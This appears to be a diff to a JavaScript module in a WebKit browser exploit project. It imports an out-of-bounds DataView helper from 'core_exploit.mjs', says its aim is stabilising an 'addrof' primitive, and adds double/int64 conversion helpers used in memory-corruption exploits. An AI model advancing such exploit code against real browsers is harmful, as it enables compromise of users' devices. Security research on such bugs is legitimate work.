@@ -1,4 +1,4 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v108 - R93 - AddrOf Stability Diagnostics)
+// js/script3/testArrayBufferVictimCrash.mjs (v108 - R93 - AddrOf Stability Diagnostics - CORRIGIDO)
 // =======================================================================================
 // ESTRATÉGIA ATUALIZADA:
 // 1. Foco total em diagnosticar e consertar a instabilidade da primitiva `addrof`.
@@ -17,10 +17,24 @@ import {
     getOOBDataView
 } from '../core_exploit.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v108_R93_AddrOf_Stability_Diagnostics";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v108_R93_AddrOf_Stability_Diagnostics_Fixed";
 
-function int64ToDouble(int64) { /* ... (código inalterado) ... */ }
-function doubleToInt64(double) { /* ... (código inalterado) ... */ }
+// --- Funções de Conversão (Double <-> Int64) ---
+function int64ToDouble(int64) {
+    const buf = new ArrayBuffer(8);
+    const u32 = new Uint32Array(buf);
+    const f64 = new Float64Array(buf);
+    u32[0] = int64.low();
+    u32[1] = int64.high();
+    return f64[0];
+}
+
+function doubleToInt64(double) {
+    const buf = new ArrayBuffer(8);
+    (new Float64Array(buf))[0] = double;
+    const u32 = new Uint32Array(buf);
+    return new AdvancedInt64(u32[0], u32[1]);
+}
 
 export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
